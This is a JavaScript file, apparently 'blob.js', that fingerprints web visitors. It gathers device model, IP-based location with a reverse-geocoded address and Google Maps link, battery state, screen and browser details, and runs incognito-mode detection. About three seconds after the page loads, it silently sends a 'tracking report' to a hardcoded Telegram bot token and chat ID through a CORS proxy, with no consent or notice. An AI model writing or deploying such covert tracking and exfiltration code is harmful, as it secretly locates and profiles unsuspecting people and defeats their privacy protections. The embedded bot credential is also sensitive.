//// Enhanced User Fingerprinting with Device Name & Accurate Battery
// At the start of blob.js

// ========== MISSING HELPER FUNCTIONS ==========
function generateSessionId() {
    return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

async function getIPWithLocation() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const result = await response.json();
        
        return {
            ip: result.ip || 'Unknown',
            city: result.city || 'Unknown',
            region: result.region || 'Unknown',
            country: result.country_name || result.country || 'Unknown',
            isp: result.org || 'Unknown',
            latitude: result.latitude || null,
            longitude: result.longitude || null
        };
    } catch (error) {
        return { ip: 'Unknown', error: error.message };
    }
}

async function getApproximateLocation() {
    return null; // Placeholder - implement if needed
}

async function getInternetInfo() {
    return { 
        connection: { effectiveType: 'unknown', downlink: 'unknown', rtt: 'unknown', quality: 'Unknown' },
        bandwidth: null 
    };
}

function getDeviceInfo() {
    const ua = navigator.userAgent;
    return {
        userAgent: ua,
        platform: navigator.platform,
        vendor: navigator.vendor || 'Unknown',
        deviceMemory: navigator.deviceMemory || 'Unknown',
        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
        touchSupport: 'ontouchstart' in window,
        vibration: 'vibrate' in navigator,
        isMobile: /Mobi|Android|iPhone|iPad|iPod/i.test(ua),
        isTablet: /iPad|Android(?!.*Mobile)/i.test(ua),
        isDesktop: !/Mobi|Android|iPhone|iPad|iPod/i.test(ua)
    };
}

async function getGPUInfo() {
    return { renderer: 'Unknown' };
}

function getConnectionInfo() {
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    return {
        effectiveType: conn?.effectiveType || 'unknown',
        downlink: conn?.downlink ? conn.downlink + ' Mbps' : 'unknown',
        rtt: conn?.rtt ? conn.rtt + ' ms' : 'unknown',
        saveData: conn?.saveData || false,
        quality: 'Unknown'
    };
}

function getStorageInfo() {
    return { localStorage: '0 Bytes', sessionStorage: '0 Bytes', cookies: '0 chars' };
}

function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browser = "Unknown";
    
    if (/chrome|chromium|crios/i.test(ua)) browser = "Chrome";
    else if (/firefox|fxios/i.test(ua)) browser = "Firefox";
    else if (/safari/i.test(ua)) browser = "Safari";
    else if (/edg/i.test(ua)) browser = "Edge";
    
    return {
        name: browser,
        version: ua.match(/(?:chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i)?.[1] || "Unknown",
        language: navigator.language,
        languages: navigator.languages || []
    };
}

function getPluginsInfo() {
    return { count: 0, plugins: [] };
}

async function getFontsList() {
    return { error: "Font Access API not supported" };
}

function getScreenInfo() {
    return {
        resolution: { width: screen.width, height: screen.height },
        colorDepth: screen.colorDepth + " bits",
        devicePixelRatio: window.devicePixelRatio
    };
}

function getDisplayInfo() {
    return {
        viewport: { width: window.innerWidth, height: window.innerHeight },
        darkMode: window.matchMedia('(prefers-color-scheme: dark)').matches
    };
}

function getPerformanceInfo() {
    return { 
        timing: { total: performance.timing?.loadEventEnd - performance.timing?.navigationStart || 0 },
        memory: null 
    };
}

async function getPreciseLocation() {
    return null;
}

// ========== ALSO FIX THESE MISSING FUNCTIONS ==========
function createDownloadButton(data) {
    // Simple implementation
    console.log("Download button would be created for:", data.deviceName);
}

function showTrackingNotification(deviceName) {
    console.log("Device detected:", deviceName);
}

function setupInteractionTracking() {
    // Basic interaction tracking
    console.log("Interaction tracking setup");
}

function shouldSendTelegram() {
    return true; // Always send
}

function markTelegramSent() {
    // Do nothing
}

// ========== DEVICE NAME DETECTION ==========
function getDeviceName() {
    const ua = navigator.userAgent.toLowerCase();
    let device = "Unknown Device";
    
    // Android devices
    if (ua.includes('samsung')) {
        if (ua.includes('sm-')) {
            // Extract Samsung model
            const match = ua.match(/sm-[a-z]\d+/);
            if (match) device = `Samsung ${match[0].toUpperCase()}`;
            else device = "Samsung Galaxy";
        } else if (ua.includes('galaxy')) {
            device = "Samsung Galaxy";
        }
    } else if (ua.includes('redmi') || ua.includes('xiaomi') || ua.includes('mi ')) {
        device = "Xiaomi Phone";
    } else if (ua.includes('pixel')) {
        device = "Google Pixel";
    } else if (ua.includes('iphone')) {
        device = "iPhone";
        // Try to detect iPhone model
        if (ua.includes('iphone15')) device = "iPhone 15";
        else if (ua.includes('iphone14')) device = "iPhone 14";
        else if (ua.includes('iphone13')) device = "iPhone 13";
        else if (ua.includes('iphone12')) device = "iPhone 12";
    } else if (ua.includes('ipad')) {
        device = "iPad";
    } else if (ua.includes('oneplus')) {
        device = "OnePlus";
    } else if (ua.includes('huawei') || ua.includes('honor')) {
        device = "Huawei";
    } else if (ua.includes('oppo')) {
        device = "OPPO";
    } else if (ua.includes('vivo')) {
        device = "Vivo";
    } else if (ua.includes('realme')) {
        device = "Realme";
    }
    
    // Try to get device model from user agent
    const modelRegex = /(?:android|like|applewebkit).*?; ([\w\s]+)(?:;|\))/i;
    const modelMatch = ua.match(modelRegex);
    if (modelMatch && modelMatch[1]) {
        const model = modelMatch[1].trim();
        if (model && model !== 'linux' && model !== 'android' && model !== 'k') {
            device += ` (${model})`;
        }
    }
    
    return device;
}

// ========== ACCURATE BATTERY INFO ==========
async function getBatteryInfo() {
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            
            // Check if browser is lying about battery (common privacy feature)
            const isAccurate = battery.level !== 1 || 
                               battery.charging !== true || 
                               battery.chargingTime !== 0 || 
                               battery.dischargingTime !== Infinity;
            
            return {
                charging: battery.charging,
                level: Math.round(battery.level * 100) + "%",
                chargingTime: battery.chargingTime === Infinity ? "Not Charging" : 
                             battery.chargingTime === 0 ? "Fully Charged" : 
                             Math.round(battery.chargingTime / 60) + " minutes",
                dischargingTime: battery.dischargingTime === Infinity ? "Unknown" : 
                                Math.round(battery.dischargingTime / 60) + " minutes",
                // Battery saving detection
                batterySaving: detectBatterySaving(),
                accurate: isAccurate,
                notes: !isAccurate ? "Browser may be hiding real battery info" : "Accurate reading"
            };
        } catch {
            return { 
                error: "Battery API blocked",
                batterySaving: detectBatterySaving()
            };
        }
    }
    return { 
        error: "Battery API not supported",
        batterySaving: detectBatterySaving()
    };
}

function detectBatterySaving() {
    // Multiple methods to detect battery saving mode
    const methods = [];
    
    // Method 1: Connection API
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection && connection.saveData) {
        methods.push("Data Saver enabled");
    }
    
    // Method 2: Performance hint
    if ('performance' in window && 'memory' in window.performance) {
        const memory = window.performance.memory;
        if (memory && memory.jsHeapSizeLimit < 100000000) { // Less than 100MB
            methods.push("Low memory mode");
        }
    }
    
    // Method 3: Reduced motion preference (some devices enable this in battery saver)
    if (window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
        methods.push("Reduced motion enabled");
    }
    
    // Method 4: Frame rate detection (battery saver often reduces frame rate)
    let frameRate = "Unknown";
    try {
        let frames = 0;
        const start = performance.now();
        const checkFrame = () => {
            frames++;
            if (frames < 60) {
                requestAnimationFrame(checkFrame);
            } else {
                const end = performance.now();
                frameRate = Math.round((frames / (end - start)) * 1000);
                if (frameRate < 30) methods.push("Low frame rate detected");
            }
        };
        requestAnimationFrame(checkFrame);
    } catch {}
    
    return methods.length > 0 ? methods.join(", ") : "No battery saving detected";
}

// ========== GOOGLE MAPS LOCATION FROM IP ==========
async function getGoogleMapsLocation(ipData) {
    if (!ipData.latitude || !ipData.longitude) {
        return "Location coordinates not available";
    }
    
    try {
        // Create Google Maps link
        const mapsLink = `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}`;
        
        // Try to get approximate address
        let address = "Approximate location";
        try {
            const response = await fetch(
                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${ipData.latitude}&lon=${ipData.longitude}&zoom=10`
            );
            const data = await response.json();
            if (data.display_name) {
                address = data.display_name.split(',').slice(0, 3).join(','); // Get first 3 parts
            }
        } catch {}
        
        return {
            googleMapsLink: mapsLink,
            approximateAddress: address,
            coordinates: `${ipData.latitude}, ${ipData.longitude}`,
            accuracy: "IP-based (usually within 10-50km)",
            staticMap: `https://maps.googleapis.com/maps/api/staticmap?center=${ipData.latitude},${ipData.longitude}&zoom=10&size=400x200&markers=color:red%7C${ipData.latitude},${ipData.longitude}&key=YOUR_API_KEY`
        };
    } catch (error) {
        return { error: "Failed to get maps location", details: error.message };
    }
}

// ========== ENHANCED INCognito DETECTION ==========
async function detectIncognito() {
    const tests = [];
    
    // Test 1: FileSystem API (most reliable)
    const fsTest = await new Promise((resolve) => {
        const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
        if (!fs) {
            resolve("FileSystem API not supported");
            return;
        }
        
        fs(window.TEMPORARY, 100, () => {
            resolve(false); // Not incognito
        }, () => {
            resolve(true); // Incognito
        });
    });
    
    tests.push({ method: "FileSystem", result: fsTest });
    
    // Test 2: Quota Management API
    const quotaTest = await new Promise((resolve) => {
        if (!navigator.storage || !navigator.storage.estimate) {
            resolve("Storage API not supported");
            return;
        }
        
        navigator.storage.estimate().then(estimate => {
            // In incognito, quota is usually very small
            resolve(estimate.quota < 120000000); // Less than 120MB
        }).catch(() => resolve("Storage estimate failed"));
    });
    
    tests.push({ method: "StorageQuota", result: quotaTest });
    
    // Test 3: User agent inconsistencies
    const ua = navigator.userAgent;
    const hasIncognitoKeywords = ua.includes('Incognito') || ua.includes('Private');
    tests.push({ method: "UAKeywords", result: hasIncognitoKeywords });
    
    // Evaluate results
    const isIncognito = tests.some(test => test.result === true);
    const uncertain = tests.every(test => 
        test.result === false || 
        typeof test.result === 'string' || 
        test.result === "Unknown"
    );
    
    return {
        isIncognito: isIncognito,
        certainty: uncertain ? "Low" : isIncognito ? "High" : "Medium",
        tests: tests,
        notes: uncertain ? "Browser may be hiding incognito mode" : 
               isIncognito ? "Incognito mode detected" : "Normal browsing mode"
    };
}

// ========== ENHANCED COLLECT DATA ==========
async function collectEnhancedData() {
    const data = {
        // Basic Info
        timestamp: new Date().toISOString(),
        sessionId: generateSessionId(),
        
        // Device Name (NEW)
        deviceName: getDeviceName(),
        
        // Network & Location
        ip: await getIPWithLocation(),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        approximateLocation: await getApproximateLocation(),
        
        // Google Maps Location (NEW)
        googleMaps: null,
        
        // Internet Information
        internet: await getInternetInfo(),
        
        // Hardware & Device
        device: getDeviceInfo(),
        gpu: await getGPUInfo(),
        battery: await getBatteryInfo(),
        connection: getConnectionInfo(),
        storage: getStorageInfo(),
        
        // Browser & Software
        browser: getBrowserInfo(),
        plugins: getPluginsInfo(),
        fonts: await getFontsList(),
        
        // Accurate Incognito Detection (FIXED)
        incognito: await detectIncognito(),
        
        // Screen & Display
        screen: getScreenInfo(),
        display: getDisplayInfo(),
        
        // Behavioral
        referrer: document.referrer,
        cookies: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        
        // Performance
        performance: getPerformanceInfo(),
        
        // Geolocation (requires permission)
        preciseLocation: null,
        
        // User Interaction
        interaction: {
            clicks: 0,
            keypresses: 0,
            scrollDepth: 0,
            timeOnSite: 0
        }
    };
    
    // Get Google Maps location from IP
    if (data.ip.latitude && data.ip.longitude) {
        data.googleMaps = await getGoogleMapsLocation(data.ip);
    }
    
    // Try to get precise location if allowed
    if (navigator.geolocation) {
        data.preciseLocation = await getPreciseLocation();
    }
    
    return data;
}

// ========== UPDATED TELEGRAM MESSAGE ==========
async function sendEnhancedDataToTelegram() {
    try {
        const data = await collectEnhancedData();
        
        // Format message for Telegram
        const telegramMessage = `
🚀 *ENHANCED TRACKING REPORT*
        
📅 *Time:* ${new Date(data.timestamp).toLocaleString()}
🆔 *Session:* ${data.sessionId}
        
📱 *DEVICE*
Name: ${data.deviceName}
Type: ${data.device.isMobile ? '📱 Mobile' : data.device.isTablet ? '📟 Tablet' : '💻 Desktop'}
Platform: ${data.device.platform}
Memory: ${data.device.deviceMemory}GB
Cores: ${data.device.hardwareConcurrency}
        
📍 *LOCATION*
IP: ${data.ip.ip || 'Unknown'}
City: ${data.ip.city || 'Unknown'}
Country: ${data.ip.country || 'Unknown'}
ISP: ${data.ip.isp || 'Unknown'}
Coordinates: ${data.ip.latitude || 'N/A'}, ${data.ip.longitude || 'N/A'}
        
🗺️ *GOOGLE MAPS*
${data.googleMaps ? data.googleMaps.approximateAddress : 'Location not available'}
📍 [Open in Google Maps](${data.googleMaps ? data.googleMaps.googleMapsLink : '#'})
        
🌐 *INTERNET*
Type: ${data.internet.connection.effectiveType}
Speed: ${data.internet.connection.downlink}
Latency: ${data.internet.connection.rtt}
Quality: ${data.internet.connection.quality || 'Unknown'}
${data.internet.bandwidth ? `Bandwidth: ${data.internet.bandwidth.averageSpeed}` : ''}
        
🔋 *BATTERY*
Level: ${data.battery.level || 'Unknown'}
Charging: ${data.battery.charging ? '⚡ Yes' : '🔋 No'}
Battery Saving: ${data.battery.batterySaving || 'Not detected'}
${data.battery.notes ? `Note: ${data.battery.notes}` : ''}
        
🌐 *BROWSER*
${data.browser.name} ${data.browser.version}
Language: ${data.browser.language}
Incognito: ${data.incognito.isIncognito ? '✅ Yes' : '❌ No'} (${data.incognito.certainty} certainty)
${data.incognito.notes ? `Note: ${data.incognito.notes}` : ''}
        
🖥️ *SCREEN*
Resolution: ${data.screen.resolution.width}x${data.screen.resolution.height}
Viewport: ${data.display.viewport.width}x${data.display.viewport.height}
Pixel Ratio: ${data.screen.devicePixelRatio}
Dark Mode: ${data.display.darkMode ? '🌙 Enabled' : '☀️ Disabled'}
        
📊 *PERFORMANCE*
Load Time: ${data.performance.timing ? Math.round(data.performance.timing.total) + 'ms' : 'N/A'}
${data.performance.memory ? 'Memory: ' + data.performance.memory.usedJSHeapSize : ''}
        
🔗 *REFERRER*
${data.referrer || 'Direct visit'}
        
👤 *USER AGENT (truncated):*
${data.device.userAgent.substring(0, 150)}...
        `;
        
        // Send to Telegram
        const result = await sendToTelegramBot(telegramMessage);
        
        if (result && result.ok) {
            console.log("✅ Enhanced data sent to Telegram");
        }
        
        return data;
    } catch (error) {
        console.error("❌ Failed to send data:", error);
        return null;
    }
}

// ========== UPDATED TEXT DOWNLOAD ==========
function formatDataForDownload(data) {
    let text = '='.repeat(60) + '\n';
    text += 'ENHANCED TRACKING DATA REPORT\n';
    text += '='.repeat(60) + '\n\n';
    
    text += `Generated: ${new Date(data.timestamp).toLocaleString()}\n`;
    text += `Session ID: ${data.sessionId}\n\n`;
    
    // Device Name
    text += '📱 DEVICE INFORMATION\n';
    text += '-' .repeat(40) + '\n';
    text += `Device Name: ${data.deviceName}\n`;
    text += `Device Type: ${data.device.isMobile ? 'Mobile' : data.device.isTablet ? 'Tablet' : 'Desktop'}\n`;
    text += `Platform: ${data.device.platform}\n`;
    text += `Memory: ${data.device.deviceMemory}GB\n`;
    text += `CPU Cores: ${data.device.hardwareConcurrency}\n`;
    text += `Touch Support: ${data.device.touchSupport ? 'Yes' : 'No'}\n`;
    text += `Vibration: ${data.device.vibration ? 'Supported' : 'Not Supported'}\n\n`;
    
    // Location with Google Maps
    text += '📍 LOCATION DATA\n';
    text += '-' .repeat(40) + '\n';
    text += `IP Address: ${data.ip.ip || 'Unknown'}\n`;
    text += `Location: ${data.ip.city || 'Unknown'}, ${data.ip.region || 'Unknown'}, ${data.ip.country || 'Unknown'}\n`;
    text += `ISP: ${data.ip.isp || 'Unknown'}\n`;
    text += `Coordinates: ${data.ip.latitude || 'N/A'}, ${data.ip.longitude || 'N/A'}\n`;
    text += `Timezone: ${data.timezone}\n`;
    
    if (data.googleMaps) {
        text += `\n🗺️ GOOGLE MAPS LOCATION\n`;
        text += `Approximate Address: ${data.googleMaps.approximateAddress}\n`;
        text += `Coordinates: ${data.googleMaps.coordinates}\n`;
        text += `Accuracy: ${data.googleMaps.accuracy}\n`;
        text += `Google Maps Link: ${data.googleMaps.googleMapsLink}\n`;
    }
    text += '\n';
    
    // Battery Info
    text += '🔋 BATTERY INFORMATION\n';
    text += '-' .repeat(40) + '\n';
    text += `Level: ${data.battery.level || 'Unknown'}\n`;
    text += `Charging: ${data.battery.charging ? 'Yes' : 'No'}\n`;
    text += `Battery Saving Mode: ${data.battery.batterySaving || 'Not detected'}\n`;
    if (data.battery.notes) text += `Note: ${data.battery.notes}\n`;
    if (data.battery.accurate !== undefined) {
        text += `Data Accuracy: ${data.battery.accurate ? 'High' : 'Low (privacy mode)'}\n`;
    }
    text += '\n';
    
    // Incognito Detection
    text += '🕵️ PRIVACY MODE DETECTION\n';
    text += '-' .repeat(40) + '\n';
    text += `Incognito/Private Mode: ${data.incognito.isIncognito ? 'Yes' : 'No'}\n`;
    text += `Certainty: ${data.incognito.certainty}\n`;
    text += `Notes: ${data.incognito.notes}\n`;
    text += '\n';
    
    return text;
}

// ========== INITIALIZE ENHANCED TRACKING ==========
function setupEnhancedTracking() {
    console.log("🔍 Setting up enhanced tracking...");
    
    // Send initial data
    setTimeout(async () => {
        const data = await sendEnhancedDataToTelegram();
        if (data) {
            console.log("✅ Enhanced tracking initialized");
        }
    }, 3000);
}

// ========== TELEGRAM SEND FUNCTION ==========
async function sendToTelegramBot(message) {
    const BOT_TOKEN = '7555872875:AAFznN3-HNBFtUcEJJTNegwfMJRfMuHvygE';
    const CHAT_ID = '7307197149';
    
    // Use CORS proxy
    const proxyUrl = 'https://corsproxy.io/?';
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    try {
        const response = await fetch(proxyUrl + encodeURIComponent(telegramUrl), {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        
        const result = await response.json();
        console.log("Telegram response:", result);
        return result;
    } catch (error) {
        console.error('Network error:', error);
        return { ok: false, error: error.message };
    }
}

// Initialize in DOMContentLoaded
document.addEventListener('DOMContentLoaded', () => {
    console.log("DOM loaded, initializing tracking...");
    if (document.getElementById("curtain")) {
        setupEnhancedTracking();
    }
});

// DEBUG: Add test button
